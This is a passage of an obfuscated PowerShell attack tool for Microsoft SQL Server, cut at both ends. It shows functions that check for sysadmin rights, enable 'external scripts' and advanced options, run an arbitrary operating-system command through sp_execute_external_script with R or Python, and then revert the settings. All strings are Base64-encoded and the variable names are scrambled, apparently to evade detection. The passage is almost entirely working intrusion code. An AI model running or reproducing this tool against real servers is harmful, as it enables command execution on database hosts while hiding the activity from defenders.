                        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAARQBuAGEAYgBsAGkAbgBnACAAZQB4AHQAZQByAG4AYQBsACAAcwBjAHIAaQBwAHQAcwAgAGYAYQBpAGwAZQBkAC4AIABBAGIAbwByAHQAaQBuAGcALgA=')))
                        $null = ${/=\_____/\/\/=\__}.Rows.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQA='))),$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHUAbABkACAAbgBvAHQAIABlAG4AYQBiAGwAZQAgAGUAeAB0AGUAcgBuAGEAbAAgAHMAYwByAGkAcAB0AHMALgA='))))
                        return
                    }
                }
                ${__/\/===\/\/==\/=} = Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBFAEwARQBDAFQAIAB2AGEAbAB1AGUAXwBpAG4AXwB1AHMAZQAgAEYAUgBPAE0AIABtAGEAcwB0AGUAcgAuAHMAeQBzAC4AYwBvAG4AZgBpAGcAdQByAGEAdABpAG8AbgBzACAAVwBIAEUAUgBFACAAbgBhAG0AZQAgAEwASQBLAEUAIAAnAGUAeAB0AGUAcgBuAGEAbAAgAHMAYwByAGkAcAB0AHMAIABlAG4AYQBiAGwAZQBkACcA'))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | select -ExpandProperty value_in_use            
                if(${__/\/===\/\/==\/=} -eq 0){
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAVABoAGUAIAAnAGUAeAB0AGUAcgBuAGEAbAAgAHMAYwByAGkAcAB0AHMAIABlAG4AYQBiAGwAZQBkACcAIABzAGUAdAB0AGkAbgBnACAAaQBzACAAbgBvAHQAIABlAG4AYQBiAGwAZQBkACAAaQBuACAAcgB1AG4AdABpAG0AZQAuAA==')))
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAALQAgAFQAaABlACAAUwBRAEwAIABTAGUAcgB2AGUAcgAgAHMAZQByAHYAaQBjAGUAIAB3AGkAbABsACAAbgBlAGUAZAAgAHQAbwAgAGIAZQAgAG0AYQBuAHUAYQBsAGwAeQAgAHIAZQBzAHQAYQByAHQAZQBkACAAZgBvAHIAIAB0AGgAZQAgAGMAaABhAG4AZwBlACAAdABvACAAdABhAGsAZQAgAGUAZgBmAGUAYwB0AC4A')))
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAALQAgAE4AbwB0ACAAcgBlAGMAbwBtAG0AZQBuAGQAZQBkACAAdQBuAGwAZQBzAHMAIAB5AG8AdQAnAHIAZQAgAHQAaABlACAARABCAEEALgA=')))
                    $null = ${/=\_____/\/\/=\__}.Rows.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQA='))),$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHQAZQByAG4AYQBsACAAcwBjAHIAaQBwAHQAcwAgAG4AbwB0ACAAZQBuAGEAYgBsAGUAZAAgAGkAbgAgAHIAdQBuAHQAaQBtAGUALgA='))))
                    return
                }else{
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAVABoAGUAIAAnAGUAeAB0AGUAcgBuAGEAbAAgAHMAYwByAGkAcAB0AHMAIABlAG4AYQBiAGwAZQBkACcAIABzAGUAdAB0AGkAbgBnACAAaQBzACAAZQBuAGEAYgBsAGUAZAAgAGkAbgAgAHIAdQBuAHQAaQBtAGUALgAnAA==')))
                }            
                write-verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABpAG4AcwB0AGEAbgBjAGUAIAA6ACAARQB4AGUAYwB1AHQAaQBuAGcAIABjAG8AbQBtAGEAbgBkADoAIAAkAEMAbwBtAG0AYQBuAGQA')))               
                ${__/\/==\/=\__/==\} = 
$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBYAEUAQwAgAHMAcABfAGUAeABlAGMAdQB0AGUAXwBlAHgAdABlAHIAbgBhAGwAXwBzAGMAcgBpAHAAdAANAAoAIAAgAEAAbABhAG4AZwB1AGEAZwBlAD0ATgAnAFIAJwAsAA0ACgAgACAAQABzAGMAcgBpAHAAdAA9AE4AJwBPAHUAdABwAHUAdABEAGEAdABhAFMAZQB0ACAAPAAtACAAZABhAHQAYQAuAGYAcgBhAG0AZQAoAHMAaABlAGwAbAAoACIAJABDAG8AbQBtAGEAbgBkACIALABpAG4AdABlAHIAbgA9AFQAKQApACcADQAKACAAIABXAEkAVABIACAAUgBFAFMAVQBMAFQAIABTAEUAVABTACAAKAAoAFsATwB1AHQAcAB1AHQAXQAgAHYAYQByAGMAaABhAHIAKABtAGEAeAApACkAKQA7AA==')))
                ${____/=\_/\___/=\/} = Get-SQLQuery -Instance $Instance -Query ${__/\/==\/=\__/==\} -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | select Output -ExpandProperty Output
                if($RawResults)
                {
                    ${____/=\_/\___/=\/}                 
                }
                else
                {
                    $null = ${/=\_____/\/\/=\__}.Rows.Add($ComputerName, $Instance, [string]${____/=\_/\___/=\/}.trim())                    
                }
                if(${_/===\_/===\/=\/=} -eq 1)
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAARABpAHMAYQBiAGwAaQBuAGcAIABlAHgAdABlAHIAbgBhAGwAIABzAGMAcgBpAHAAdABzAA==')))
                    Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAGUAeAB0AGUAcgBuAGEAbAAgAHMAYwByAGkAcAB0AHMAIABlAG4AYQBiAGwAZQBkACcALAAwADsAUgBFAEMATwBOAEYASQBHAFUAUgBFACAAVwBJAFQASAAgAE8AVgBFAFIAUgBJAEQARQA='))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
                }
                if(${_/\_/\/=\/\/=\/\_} -eq 1)
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAARABpAHMAYQBiAGwAaQBuAGcAIABTAGgAbwB3ACAAQQBkAHYAYQBuAGMAZQBkACAATwBwAHQAaQBvAG4AcwA=')))
                    Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAFMAaABvAHcAIABBAGQAdgBhAG4AYwBlAGQAIABPAHAAdABpAG8AbgBzACcALAAwADsAUgBFAEMATwBOAEYASQBHAFUAUgBFAA=='))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
                }
                ${__/=\____/\__/==\}.Close()
                ${__/=\____/\__/==\}.Dispose()
            }
            catch
            {
                if(-not $SuppressVerbose)
                {
                    ${/=\_______/===\__} = $_.Exception.Message
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAEYAYQBpAGwAZQBkAC4A')))
                }
                $null = ${/=\_____/\/\/=\__}.Rows.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQA='))),$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAHQAIABBAGMAYwBlAHMAcwBpAGIAbABlACAAbwByACAAQwBvAG0AbQBhAG4AZAAgAEYAYQBpAGwAZQBkAA=='))))
            }
        }
        ${____/\/=\_/\/===\} | Invoke-Parallel -ScriptBlock ${____/\__/\_/=\__/} -ImportSessionFunctions -ImportVariables -Throttle $Threads -RunspaceTimeout 2 -Quiet -ErrorAction SilentlyContinue
        return ${/=\_____/\/\/=\__}
    }
}
Function  Invoke-SQLOSCmdPython
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
		[Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server database to connection to.')]
        [string]$Database,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Connect using Dedicated Admin Connection.')]
        [Switch]$DAC,
        [Parameter(Mandatory = $true,
        HelpMessage = 'OS command to be executed.')]
        [String]$Command = "whoami",
        [Parameter(Mandatory = $false,
        HelpMessage = 'Connection timeout.')]
        [string]$TimeOut,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of threads.')]
        [int]$Threads = 1,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Just show the raw results without the computer or instance name.')]
        [switch]$RawResults
    )
    Begin
    {
        ${_____/===\_/=====} = New-Object -TypeName System.Data.DataTable
        ${/=\_____/\/\/=\__} = New-Object -TypeName System.Data.DataTable
        $null = ${/=\_____/\/\/=\__}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = ${/=\_____/\/\/=\__}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = ${/=\_____/\/\/=\__}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AbQBhAG4AZABSAGUAcwB1AGwAdABzAA=='))))
        ${____/\/=\_/\/===\} = New-Object -TypeName System.Data.DataTable
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        if($Instance)
        {
            ${_/\/=\/=\/\/\____} = New-Object -TypeName PSObject -Property @{
                Instance = $Instance
            }
        }
        ${____/\/=\_/\/===\} = ${____/\/=\_/\/===\} + ${_/\/=\/=\/\/\____}
    }
    Process
    {
        ${____/\/=\_/\/===\} = ${____/\/=\_/\/===\} + $_
    }
    End
    {
        ${____/\__/\_/=\__/} = {
            $Instance = $_.Instance
            $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
            if(-not $Instance)
            {
                $Instance = $env:COMPUTERNAME
            }
            if($DAC)
            {
                ${__/=\____/\__/==\} = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DAC -TimeOut $TimeOut
            }
            if($Database)
            {
                ${__/=\____/\__/==\} = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Database $Database -Credential $Credential -TimeOut $TimeOut
            }
            else
            {
                ${__/=\____/\__/==\} = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -TimeOut $TimeOut
            }
            try
            {
                ${__/=\____/\__/==\}.Open()
                if(-not $SuppressVerbose)
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAFMAdQBjAGMAZQBzAHMALgA=')))
                }
                ${_/\_/\/=\/\/=\/\_} = 0
                ${_/===\_/===\/=\/=} = 0
                ${__/\/==\____/\_/=} = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose | select -Property IsSysadmin -ExpandProperty IsSysadmin
                if(${__/\/==\____/\_/=} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA'))))
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAWQBvAHUAIABhAHIAZQAgAGEAIABzAHkAcwBhAGQAbQBpAG4ALgA=')))
                    ${_____/\_/\__/==\_} = Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAGUAeAB0AGUAcgBuAGEAbAAgAHMAYwByAGkAcAB0AHMAIABlAG4AYQBiAGwAZQBkACcA'))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | select -Property config_value -ExpandProperty config_value
                    ${_/\/===\/\/\/==\/} = Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAFMAaABvAHcAIABBAGQAdgBhAG4AYwBlAGQAIABPAHAAdABpAG8AbgBzACcA'))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | select -Property config_value -ExpandProperty config_value
                }
				if($Database)
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAARQB4AGUAYwB1AHQAaQBuAGcAIABvAG4AIAAkAEQAYQB0AGEAYgBhAHMAZQA=')))
                    ${_____/\_/\__/==\_} = Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAGUAeAB0AGUAcgBuAGEAbAAgAHMAYwByAGkAcAB0AHMAIABlAG4AYQBiAGwAZQBkACcA'))) -Username $Username -Password $Password -Database $Database -Credential $Credential -SuppressVerbose | select -Property config_value -ExpandProperty config_value
                    ${_/\/===\/\/\/==\/} = Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAFMAaABvAHcAIABBAGQAdgBhAG4AYwBlAGQAIABPAHAAdABpAG8AbgBzACcA'))) -Username $Username -Password $Password -Database $Database -Credential $Credential -SuppressVerbose | select -Property config_value -ExpandProperty config_value
                }
                else
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAWQBvAHUAIABhAHIAZQAgAG4AbwB0ACAAYQAgAHMAeQBzAGEAZABtAGkAbgAuACAAVABoAGkAcwAgAGMAbwBtAG0AYQBuAGQAIAByAGUAcQB1AGkAcgBlAHMAIABzAHkAcwBhAGQAbQBpAG4AIABwAHIAaQB2AGkAbABlAGcAZQBzAC4A')))
                    $null = ${/=\_____/\/\/=\__}.Rows.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQA='))),$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvACAAcwB5AHMAYQBkAG0AaQBuACAAcAByAGkAdgBpAGwAZQBnAGUAcwAuAA=='))))
                    return
                }
                if (${_/\/===\/\/\/==\/} -eq 1)
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAUwBoAG8AdwAgAEEAZAB2AGEAbgBjAGUAZAAgAE8AcAB0AGkAbwBuAHMAIABpAHMAIABhAGwAcgBlAGEAZAB5ACAAZQBuAGEAYgBsAGUAZAAuAA==')))
                }
                else
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAUwBoAG8AdwAgAEEAZAB2AGEAbgBjAGUAZAAgAE8AcAB0AGkAbwBuAHMAIABpAHMAIABkAGkAcwBhAGIAbABlAGQALgA=')))
                    ${_/\_/\/=\/\/=\/\_} = 1
                    Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAFMAaABvAHcAIABBAGQAdgBhAG4AYwBlAGQAIABPAHAAdABpAG8AbgBzACcALAAxADsAUgBFAEMATwBOAEYASQBHAFUAUgBFAA=='))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
                    ${__/\____/\/\_/\/\} = Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAFMAaABvAHcAIABBAGQAdgBhAG4AYwBlAGQAIABPAHAAdABpAG8AbgBzACcA'))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | select -Property config_value -ExpandProperty config_value
                    if (${__/\____/\/\_/\/\} -eq 1)
                    {
                        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAARQBuAGEAYgBsAGUAZAAgAFMAaABvAHcAIABBAGQAdgBhAG4AYwBlAGQAIABPAHAAdABpAG8AbgBzAC4A')))
                    }
                    else
                    {
                        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAARQBuAGEAYgBsAGkAbgBnACAAUwBoAG8AdwAgAEEAZAB2AGEAbgBjAGUAZAAgAE8AcAB0AGkAbwBuAHMAIABmAGEAaQBsAGUAZAAuACAAQQBiAG8AcgB0AGkAbgBnAC4A')))
                        $null = ${/=\_____/\/\/=\__}.Rows.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQA='))),$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHUAbABkACAAbgBvAHQAIABlAG4AYQBiAGwAZQAgAFMAaABvAHcAIABBAGQAdgBhAG4AYwBlAGQAIABPAHAAdABpAG8AbgBzAC4A'))))
                        return
                    }
                }
                if (${_____/\_/\__/==\_} -eq 1)
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAARQB4AHQAZQByAG4AYQBsACAAcwBjAHIAaQBwAHQAcwAgAGEAcgBlACAAYQBsAHIAZQBhAGQAeQAgAGUAbgBhAGIAbABlAGQALgA=')))
                }
                else
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAARQB4AHQAZQByAG4AYQBsACAAcwBjAHIAaQBwAHQAcwAgAGUAbgBhAGIAbABlAGQAIABhAHIAZQAgAGQAaQBzAGEAYgBsAGUAZAAuAA==')))
                    ${_/===\_/===\/=\/=} = 1
                    Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAGUAeAB0AGUAcgBuAGEAbAAgAHMAYwByAGkAcAB0AHMAIABlAG4AYQBiAGwAZQBkACcALAAxADsAUgBFAEMATwBOAEYASQBHAFUAUgBFACAAVwBJAFQASAAgAE8AVgBFAFIAUgBJAEQARQA='))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
                    ${/=\_______/\_/\_/} = Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAiAGUAeAB0AGUAcgBuAGEAbAAgAHMAYwByAGkAcAB0AHMAIABlAG4AYQBiAGwAZQBkACIA'))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | select -Property config_value -ExpandProperty config_value
                    if (${/=\_______/\_/\_/} -eq 1)
                    {
                        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAARQBuAGEAYgBsAGUAZAAgAGUAeAB0AGUAcgBuAGEAbAAgAHMAYwByAGkAcAB0AHMALgA=')))
                    }
                    else
                    {
                        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAARQBuAGEAYgBsAGkAbgBnACAAZQB4AHQAZQByAG4AYQBsACAAcwBjAHIAaQBwAHQAcwAgAGYAYQBpAGwAZQBkAC4AIABBAGIAbwByAHQAaQBuAGcALgA=')))
                        $null = ${/=\_____/\/\/=\__}.Rows.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQA='))),$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHUAbABkACAAbgBvAHQAIABlAG4AYQBiAGwAZQAgAGUAeAB0AGUAcgBuAGEAbAAgAHMAYwByAGkAcAB0AHMALgA='))))
                        return
                    }
                }
                if(${__/\/==\____/\_/=} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA')))){
					${__/\/===\/\/==\/=} = Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBFAEwARQBDAFQAIAB2AGEAbAB1AGUAXwBpAG4AXwB1AHMAZQAgAEYAUgBPAE0AIABtAGEAcwB0AGUAcgAuAHMAeQBzAC4AYwBvAG4AZgBpAGcAdQByAGEAdABpAG8AbgBzACAAVwBIAEUAUgBFACAAbgBhAG0AZQAgAEwASQBLAEUAIAAnAGUAeAB0AGUAcgBuAGEAbAAgAHMAYwByAGkAcAB0AHMAIABlAG4AYQBiAGwAZQBkACcA'))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | select -ExpandProperty value_in_use            
                }
				if($Database){
					${__/\/===\/\/==\/=} = Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBFAEwARQBDAFQAIAB2AGEAbAB1AGUAXwBpAG4AXwB1AHMAZQAgAEYAUgBPAE0AIABtAGEAcwB0AGUAcgAuAHMAeQBzAC4AYwBvAG4AZgBpAGcAdQByAGEAdABpAG8AbgBzACAAVwBIAEUAUgBFACAAbgBhAG0AZQAgAEwASQBLAEUAIAAnAGUAeAB0AGUAcgBuAGEAbAAgAHMAYwByAGkAcAB0AHMAIABlAG4AYQBiAGwAZQBkACcA'))) -Username $Username -Password $Password -Database $Database -Credential $Credential -SuppressVerbose | select -ExpandProperty value_in_use
				}
				if(${__/\/===\/\/==\/=} -eq 0){
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAVABoAGUAIAAnAGUAeAB0AGUAcgBuAGEAbAAgAHMAYwByAGkAcAB0AHMAIABlAG4AYQBiAGwAZQBkACcAIABzAGUAdAB0AGkAbgBnACAAaQBzACAAbgBvAHQAIABlAG4AYQBiAGwAZQBkACAAaQBuACAAcgB1AG4AdABpAG0AZQAuAA==')))
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAALQAgAFQAaABlACAAUwBRAEwAIABTAGUAcgB2AGUAcgAgAHMAZQByAHYAaQBjAGUAIAB3AGkAbABsACAAbgBlAGUAZAAgAHQAbwAgAGIAZQAgAG0AYQBuAHUAYQBsAGwAeQAgAHIAZQBzAHQAYQByAHQAZQBkACAAZgBvAHIAIAB0AGgAZQAgAGMAaABhAG4AZwBlACAAdABvACAAdABhAGsAZQAgAGUAZgBmAGUAYwB0AC4A')))
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAALQAgAE4AbwB0ACAAcgBlAGMAbwBtAG0AZQBuAGQAZQBkACAAdQBuAGwAZQBzAHMAIAB5AG8AdQAnAHIAZQAgAHQAaABlACAARABCAEEALgA=')))
                    $null = ${/=\_____/\/\/=\__}.Rows.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQA='))),$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHQAZQByAG4AYQBsACAAcwBjAHIAaQBwAHQAcwAgAG4AbwB0ACAAZQBuAGEAYgBsAGUAZAAgAGkAbgAgAHIAdQBuAHQAaQBtAGUALgA='))))
                    return
                }else{
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAVABoAGUAIAAnAGUAeAB0AGUAcgBuAGEAbAAgAHMAYwByAGkAcAB0AHMAIABlAG4AYQBiAGwAZQBkACcAIABzAGUAdAB0AGkAbgBnACAAaQBzACAAZQBuAGEAYgBsAGUAZAAgAGkAbgAgAHIAdQBuAHQAaQBtAGUALgAnAA==')))
                }            
                write-verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABpAG4AcwB0AGEAbgBjAGUAIAA6ACAARQB4AGUAYwB1AHQAaQBuAGcAIABjAG8AbQBtAGEAbgBkADoAIAAkAEMAbwBtAG0AYQBuAGQA')))               
                ${__/\/==\/=\__/==\} = 
